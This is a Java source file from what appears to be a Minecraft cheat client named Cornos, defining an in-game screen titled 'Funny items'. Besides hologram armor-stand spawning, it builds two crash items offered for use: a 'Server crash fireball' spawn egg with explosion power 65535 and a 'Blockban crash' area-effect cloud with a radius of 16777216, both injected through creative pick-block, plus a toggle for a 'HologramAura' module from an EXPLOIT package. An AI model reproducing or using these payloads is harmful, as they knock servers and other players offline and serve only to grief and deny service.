/*
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
# Project: Cornos
# File: FunnyItemsScreen
# Created by constantin at 12:35, Mär 19 2021
PLEASE READ THE COPYRIGHT NOTICE IN THE PROJECT ROOT, IF EXISTENT
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
*/
package me.constantindev.ccl.gui;

import me.constantindev.ccl.Cornos;
import me.constantindev.ccl.command.Hologram;
import me.constantindev.ccl.etc.reg.ModuleRegistry;
import me.constantindev.ccl.module.EXPLOIT.HologramAura;
import me.constantindev.ccl.module.ext.Hud;
import net.minecraft.client.gui.DrawableHelper;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.CheckboxWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.*;
import net.minecraft.text.Text;
import net.minecraft.util.math.Vec3d;

import java.awt.*;

public class FunnyItemsScreen extends Screen {
    TextFieldWidget armorStandName;
    TextFieldWidget pos;
    TextFieldWidget standAuraName;
    CheckboxWidget armorStandSpawnegg;

    public FunnyItemsScreen() {
        super(Text.of("Funny items"));
    }

    double roundToDecimalPoint(double inp, int point) {
        double divident = Math.pow(10, point);
        return Math.round(inp * divident) / divident;
    }

    @Override
    protected void init() {
        assert Cornos.minecraft.player != null;
        Vec3d ppos = Cornos.minecraft.player.getPos();
        armorStandName = new TextFieldWidget(textRenderer, 5, 20, 200, 20, Text.of("Armor stand name"));
        armorStandName.setMaxLength(65535);
        pos = new TextFieldWidget(textRenderer, 5, 45, 120, 20, Text.of("Position"));
        ButtonWidget currentPos = new ButtonWidget(130, 45, 75, 20, Text.of("Current pos"), button -> pos.setText(roundToDecimalPoint(ppos.x, 2) + " " + roundToDecimalPoint(ppos.y, 2) + " " + roundToDecimalPoint(ppos.z, 2)));
        pos.setMaxLength(65535);
        pos.setText(roundToDecimalPoint(ppos.x, 2) + " " + roundToDecimalPoint(ppos.y, 2) + " " + roundToDecimalPoint(ppos.z, 2));
        armorStandSpawnegg = new CheckboxWidget(5, 70, 60, 20, Text.of("Create spawn egg"), false);
        ButtonWidget spawnStand = new ButtonWidget(5, 95, 200, 20, Text.of("Spawn hologram"), button -> {
            double x, y, z;
            String[] coords = this.pos.getText().split(" ");
            boolean isValid = coords.length == 3;
            try {
                for (String s : coords) {
                    Double.parseDouble(s);
                }
            } catch (Exception ignored) {
                isValid = false;
            }
            if (!isValid) {
                this.pos.setEditableColor(new Color(255, 50, 50).getRGB());
                return;
            } else this.pos.setEditableColor(new Color(255, 255, 255).getRGB());

            x = Double.parseDouble(coords[0]);
            y = Double.parseDouble(coords[1]);
            z = Double.parseDouble(coords[2]);
            Hologram.spawnHologram(new Vec3d(x, y, z), armorStandName.getText(), armorStandSpawnegg.isChecked(), false, "armor_stand");
        });
        standAuraName = new TextFieldWidget(textRenderer, 5, 130, 200, 20, Text.of("Sus"));
        standAuraName.setMaxLength(65535);
        ButtonWidget enableStandAura = new ButtonWidget(5, 155, 200, 20, Text.of("Enable stand aura"), button -> {
            if (standAuraName.getText().isEmpty()) return;
            HologramAura.message = standAuraName.getText();
            ModuleRegistry.getByName("hologramaura").isOn.setState(true);

        });
        ButtonWidget crashFireball = new ButtonWidget(210, 20, 200, 20, Text.of("Server crash fireball"), button -> {
            ItemStack is = new ItemStack(Items.BAT_SPAWN_EGG);
            is.setCustomName(Text.of("§r§cOuch. §4Generated by §lCornos"));
            CompoundTag ct = is.getOrCreateSubTag("EntityTag");
            ListTag vel = new ListTag();
            vel.add(DoubleTag.of(0));
            vel.add(DoubleTag.of(-0.5));
            vel.add(DoubleTag.of(0));
            ct.put("power", vel);
            ct.put("id", StringTag.of("minecraft:fireball"));
            ct.put("ExplosionPower", DoubleTag.of(65535));
            Cornos.minecraft.player.inventory.addPickBlock(is);
        });
        ButtonWidget blockban = new ButtonWidget(210, 45, 200, 20, Text.of("Blockban crash"), button -> {
            //{EntityTag:{id:"minecraft:area_effect_cloud",Particle:"barrier",Radius:16777216f,RadiusPerTick:0f,Duration:1310700,WaitTime:60}}
            ItemStack is = new ItemStack(Items.BAT_SPAWN_EGG);
            is.setCustomName(Text.of("§r§cBlockban. §4Generated by §lCornos"));
            CompoundTag ct = is.getOrCreateSubTag("EntityTag");
            ct.put("id", StringTag.of("minecraft:area_effect_cloud"));
            ct.put("Particle", StringTag.of("barrier"));
            ct.put("Radius", FloatTag.of(16777216f));
            ct.put("RadiusPerTick", FloatTag.of(0f));
            ct.put("Duration", IntTag.of(1310700));
            ct.put("WaitTime", IntTag.of(60));
            Cornos.minecraft.player.inventory.addPickBlock(is);
        });
        this.addButton(currentPos);
        this.addButton(spawnStand);
        this.addButton(crashFireball);
        this.addButton(enableStandAura);
        this.addButton(blockban);
        super.init();
    }

    @Override
    public void render(MatrixStack matrices, int mouseX, int mouseY, float delta) {
        DrawableHelper.fill(matrices, 0, 0, width, height, new Color(0, 0, 0, 175).getRGB());
        // holo generator
        DrawableHelper.drawCenteredString(matrices, textRenderer, "Hologram", 105, 5, 0xFFFFFF);
        armorStandName.render(matrices, mouseX, mouseY, delta);
        armorStandSpawnegg.render(matrices, mouseX, mouseY, delta);
        DrawableHelper.drawCenteredString(matrices, textRenderer, "Hologram aura", 105, 120, 0xFFFFFF);
        standAuraName.render(matrices, mouseX, mouseY, delta);
        pos.render(matrices, mouseX, mouseY, delta);
        // item presets
        DrawableHelper.drawCenteredString(matrices, textRenderer, "Funny items²", 310, 5, 0xFFFFFF);


        textRenderer.draw(matrices, "Remember to open your inventory before using these", 1, height - 10, Hud.themeColor.getRGB());
        super.render(matrices, mouseX, mouseY, delta);
    }

    @Override
    public boolean charTyped(char chr, int keyCode) {
        armorStandName.charTyped(chr, keyCode);
        pos.charTyped(chr, keyCode);
        standAuraName.charTyped(chr, keyCode);
        return false;
    }

    @Override
    public boolean keyReleased(int keyCode, int scanCode, int modifiers) {
        armorStandName.keyReleased(keyCode, scanCode, modifiers);
        pos.keyReleased(keyCode, scanCode, modifiers);
        standAuraName.keyReleased(keyCode, scanCode, modifiers);
        return false;
    }

    @Override
    public boolean keyPressed(int keyCode, int scanCode, int modifiers) {
        armorStandName.keyPressed(keyCode, scanCode, modifiers);
        pos.keyPressed(keyCode, scanCode, modifiers);
        standAuraName.keyPressed(keyCode, scanCode, modifiers);
        return super.keyPressed(keyCode, scanCode, modifiers);
    }

    @Override
    public boolean mouseClicked(double mouseX, double mouseY, int button) {
        armorStandSpawnegg.mouseClicked(mouseX, mouseY, button);
        armorStandName.mouseClicked(mouseX, mouseY, button);
        pos.mouseClicked(mouseX, mouseY, button);
        standAuraName.mouseClicked(mouseX, mouseY, button);
        return super.mouseClicked(mouseX, mouseY, button);
    }
}
